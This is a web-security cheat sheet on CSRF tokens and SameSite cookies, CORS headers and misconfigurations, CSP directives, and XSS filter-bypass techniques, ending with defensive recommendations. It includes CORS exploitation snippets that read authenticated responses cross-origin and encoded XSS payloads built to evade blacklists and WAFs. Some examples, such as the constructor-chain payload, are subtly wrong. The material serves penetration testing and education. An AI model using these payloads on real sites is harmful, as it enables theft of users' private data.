## CSRF Defenses
Cross-Site Request Forgery (CSRF) attacks force authenticated users to submit unwanted requests to web applications where they're currently logged in. The following mechanisms prevent these attacks:

### CSRF Tokens
**Mechanism**: Cryptographically secure, unpredictable random values embedded in HTML forms.

**Requirements**:
- **Unpredictability**: Must be generated using cryptographically secure random number generators (CSPRNG)
- **Session Binding**: Token must be tied to the specific user's session; using a global token defeats the purpose
- **Validation**: Server must verify the token matches the session on every state-changing request

**Implementation Example**:
```html
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="dGhpcyBpcyBhIHRlc3QgdG9rZW4=">
    <input type="text" name="amount">
    <input type="text" name="to_account">
</form>
```

**Bypass Considerations**: Tokens can be bypassed if:
- Application accepts GET requests for state-changing actions (token not validated)
- Token is not tied to the session (attacker can use their own token)
- Token is vulnerable to XSS (attacker steals token via script injection)
- Token validation is skipped if the header is missing (race conditions)

### HTTP Headers

#### Origin Header
- **Purpose**: Indicates where the request originated (scheme + host + port)
- **Behavior**: Automatically set by browsers for cross-origin requests
- **Limitation**: Not sent for all requests (e.g., same-origin requests, certain legacy scenarios)

#### Referer Header
- **Purpose**: Contains the URL of the page that linked to the currently requested page
- **Validation Strategy**: Server checks if Referer matches the application's domain
- **Weaknesses**: 
  - Can be stripped by privacy extensions or HTTPS→HTTP downgrades
  - Some corporate proxies remove this header
  - Not reliable as sole defense mechanism

### SameSite Cookie Attribute

Controls whether cookies are sent with cross-origin requests, providing CSRF protection at the browser level.

| Attribute | Behavior | Use Case |
|-----------|----------|----------|
| `none` | Cookie sent with **all** cross-origin requests | Third-party integrations, analytics; requires `Secure` attribute |
| `lax` | Cookie sent with top-level navigation (GET requests, links) but **not** with POST forms or AJAX from third-party sites | Default in modern browsers; balances security and usability |
| `strict` | Cookie **never** sent with cross-origin requests | High-security applications; may break user experience (e.g., following links from email) |

**Example**:
```http
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
```

**Important**: `SameSite=None` requires the `Secure` attribute (HTTPS only). Without this combination, modern browsers reject the cookie.

---

## Cross-Origin Resource Sharing (CORS)

CORS is a browser security mechanism that allows controlled access to resources located outside of a given domain. While designed to enable legitimate cross-origin requests, misconfigurations create security vulnerabilities.

### CORS Response Headers

#### Access-Control-Allow-Origin
- **Function**: Specifies which origins can access the resource
- **Values**: Specific origin (`https://trusted.com`) or wildcard (`*`)
- **Security Note**: Using `*` with credentials (`Access-Control-Allow-Credentials: true`) is blocked by browsers, but specific origin reflection is dangerous

#### Access-Control-Expose-Headers
- **Function**: Allows JavaScript to read specific response headers normally hidden from `XMLHttpRequest`/`fetch`
- **Default exposed**: `Cache-Control`, `Content-Language`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`

#### Access-Control-Allow-Methods
- **Function**: Lists permitted HTTP methods for cross-origin requests (e.g., `GET, POST, PUT`)
- **Context**: Returned in response to preflight requests

#### Access-Control-Allow-Headers
- **Function**: Lists permitted custom headers for cross-origin requests
- **Common values**: `Content-Type`, `Authorization`, `X-Requested-With`

#### Access-Control-Allow-Credentials
- **Function**: When set to `true`, allows cross-origin requests to include credentials (cookies, Authorization headers, TLS client certificates)
- **Critical Restriction**: Cannot be used with wildcard (`*`) `Access-Control-Allow-Origin`

#### Access-Control-Max-Age
- **Function**: Caches preflight results for specified seconds (default varies by browser, typically 5 seconds to 24 hours)
- **Optimization**: Reduces network overhead for complex requests

### Request Headers (Client-Side)

#### Access-Control-Request-Method
- **Usage**: Sent in preflight `OPTIONS` requests to inform server which HTTP method will be used in the actual request

#### Access-Control-Request-Headers
- **Usage**: Sent in preflight to inform server which custom headers will be included

### Simple vs Preflighted Requests

Browsers categorize CORS requests to optimize performance:

#### Simple Requests
**Criteria**:
- Method: `GET`, `HEAD`, or `POST`
- Headers: Only CORS-safelisted headers (e.g., `Accept`, `Content-Type` with specific values)
- Content-Type (if POST): `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

**Behavior**: Sent immediately; browser adds `Origin` header; server responds with CORS headers

#### Preflighted Requests
**Criteria**: Any request that doesn't meet Simple Request criteria (custom headers, `PUT`/`DELETE`, `application/json` Content-Type)

**Process**:
1. Browser sends `OPTIONS` preflight request
2. Server responds with permitted origins, methods, headers
3. If allowed, browser sends actual request
4. If denied, browser blocks request (network error visible to JavaScript)

### CORS Misconfigurations & Exploitation

#### Arbitrary Origin Reflection
**Vulnerability**: Server reflects any `Origin` header value in `Access-Control-Allow-Origin` without validation

**Exploitation**:
```javascript
// Attacker's malicious site
fetch('https://victim.com/api/private', {
    method: 'GET',
    credentials: 'include'
})
.then(r => r.json())
.then(data => exfiltrate(data));
```

**Impact**: Complete bypass of Same-Origin Policy (SOP); attacker can read authenticated responses

#### Improper Origin Whitelist
**Vulnerability**: Weak validation allowing subdomain takeover or partial matches

**Examples**:
- Prefix match: `https://attacker.com` matches whitelist entry `https://victim.com` (if checking `indexOf`)
- Suffix match: `https://victim.com.attacker.com` bypasses checks for `victim.com`

#### Trusted Null Origin
**Vulnerability**: Server accepts `Origin: null` as valid

**Attack Vectors**:
- Sandboxed iframes (`<iframe sandbox>`)
- Local HTML files (`file://` protocol)
- Redirects via `data:` URIs

**Exploit**:
```html
<iframe sandbox="allow-scripts" srcdoc="
    <script>
        fetch('https://victim.com/api', {credentials: 'include'})
        .then(r => r.text())
        .then(t => parent.postMessage(t, '*'));
    </script>
"></iframe>
```

---

## Content Security Policy (CSP)

CSP is a defense-in-depth mechanism that prevents XSS and data injection attacks by restricting the sources from which content can be loaded and the actions scripts can perform.

### Common CSP Directives

| Directive | Controls | Example |
|-----------|----------|---------|
| `script-src` | JavaScript execution sources | `'self'`, `https://cdn.example.com` |
| `style-src` | Stylesheet sources | `'self'`, `'unsafe-inline'` |
| `img-src` | Image sources | `data:`, `https:` |
| `object-src` | Plugin content (`<object>`, `<embed>`) | `'none'` (recommended) |
| `connect-src` | XHR, WebSocket, EventSource connections | `'self'`, `api.example.com` |
| `default-src` | Fallback for unspecified directives | `'self'` |
| `frame-ancestors` | Who can embed this page (`<iframe>`, etc.) | `'none'` (clickjacking protection) |
| `form-action` | Where forms can submit | `'self'` |

### Critical CSP Keywords

- `'none'`: Disallows the resource type completely
- `'self'`: Allows same-origin resources only
- `'unsafe-inline'`: Allows inline scripts/styles (defeats XSS protection)
- `'unsafe-eval'`: Allows `eval()` and similar (required by some frameworks but dangerous)
- `'strict-dynamic'`: Trust scripts with nonces, allow their loaded dependencies (modern approach)

### CSP Bypass Considerations

While CSP is powerful, bypasses exist:
- **JSONP endpoints**: If `script-src` includes trusted domains with JSONP callbacks, attackers can inject code via callback parameters
- **AngularJS**: If libraries like Angular are allowed, template injection can execute JavaScript via `ng-app` directives
- **Script gadgets**: Existing trusted scripts that accept user input and execute it (e.g., jQuery `$.html()`, `setTimeout` with string arguments)

---

## XSS Filter Bypasses

Modern web applications employ input filters and Web Application Firewalls (WAFs) to block XSS payloads. The following techniques evade pattern-based detection.

### Weak Blacklist Evasion

#### Case Variation
**Technique**: Mixing uppercase and lowercase letters to bypass case-sensitive filters

**Examples**:
```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

**Explanation**: HTML tags and attributes are case-insensitive in HTML5. JavaScript protocol handlers (`javascript:`) are also case-insensitive in most browsers.

#### Space Elimination
**Technique**: Removing spaces between tag names and attributes

**Example**:
```html
<svg/onload=alert(1)>
```

**Explanation**: HTML parsers accept forward slashes as attribute separators in certain contexts, eliminating the need for spaces that filters might require.

### JavaScript Encoding Techniques

When filters block literal strings like `alert`, encode the payload using JavaScript's built-in functions.

#### Unicode Escapes
**Syntax**: `\uXXXX` (4 hex digits)

**Example**:
```javascript
eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029") // alert(1)
```

**Use case**: Bypasses filters searching for "alert" literal strings.

#### Octal Escapes
**Syntax**: `\XXX` (1-3 octal digits, 0-377)

**Example**:
```javascript
"\141\154\145\162\164\50\61\51" // alert(1)
```

#### Hexadecimal Escapes
**Syntax**: `\xXX` (2 hex digits)

**Example**:
```javascript
"\x61\x6c\x65\x72\x74\x28\x31\x29" // alert(1)
```

#### Base64 Decoding
**Function**: `atob()` (ASCII to Binary)

**Example**:
```javascript
eval(atob("YWxlcnQoMSk=")) // alert(1) in base64
```

### String Construction Techniques

When string literals are blocked, construct strings dynamically.

#### fromCharCode
**Method**: `String.fromCharCode(num1, num2, ...)`

**Example**:
```javascript
eval(String.fromCharCode(97,108,101,114,116,40,49,41)) // alert(1)
```

**Advantage**: No alphanumeric characters in payload; purely numeric arguments.

#### Regex Source Property
**Technique**: Extract string from regex literal

**Example**:
```javascript
/alert(1)/.source           // Returns "alert(1)"
decodeURI(/alert(%22xss%22)/.source)  // Decodes URL encoding in regex
```

### Execution Sinks

Even if `alert` is blocked, these JavaScript functions execute code passed as strings.

#### eval()
**Behavior**: Executes string as JavaScript code
```javascript
eval("alert(1)")
```
**Risk**: Most dangerous; executes arbitrary code in current scope.

#### setTimeout() / setInterval()
**Behavior**: Execute code after delay; accepts string as first argument
```javascript
setTimeout("alert(1)", 100)
setInterval("alert(1)", 1000)
```
**Note**: Modern browsers deprecate string arguments in favor of functions, but still supported for backward compatibility.

#### Function Constructor
**Behavior**: Creates new function from string; immediately invoked with `()`
```javascript
Function("alert(1)")()
```

#### Array Constructor Chain
**Technique**: Access Function constructor through array prototype chain
```javascript
[].constructor.constructor(alert(1))()
// Array -> Array constructor -> Function constructor -> execution
```

**Explanation**: `[].constructor` returns `Array`, `.constructor` again returns `Function`, which when called with code executes it. Bypasses filters blocking "eval" or "Function" literals when property access is allowed.

---

## Defensive Recommendations

### Against CSRF
1. Implement double-submit cookie pattern (token in cookie and request parameter)
2. Use `SameSite=Lax` or `SameSite=Strict` on session cookies
3. Validate `Origin` and `Referer` headers as secondary defenses
4. Require re-authentication for sensitive actions

### Against CORS Misconfiguration
1. Never reflect arbitrary `Origin` headers when credentials are supported
2. Maintain strict whitelist with exact string matching (no wildcards)
3. Avoid `null` in allowed origins list
4. Minimize use of `Access-Control-Allow-Credentials: true`

### Against XSS
1. **Output Encoding**: Context-aware encoding (HTML, JavaScript, URL, CSS)
2. **Content Security Policy**: Use nonces (`nonce-`) or hashes for inline scripts; avoid `'unsafe-inline'`
3. **HttpOnly Cookies**: Prevent JavaScript access to session cookies
4. **Input Validation**: Whitelist approach on server-side; client-side validation is for UX only

### Against Filter Bypass
1. Use parser-based sanitization libraries (e.g., DOMPurify) rather than regex blacklists
2. Implement Content Security Policy as second line of defense
3. Regularly update WAF rules to cover new encoding techniques
4. Use prepared statements/parameterized queries (also prevents SQLi)

---

**Note**: This cheat sheet covers advanced exploitation techniques for authorized penetration testing and security research. Always obtain proper authorization before testing systems you do not own.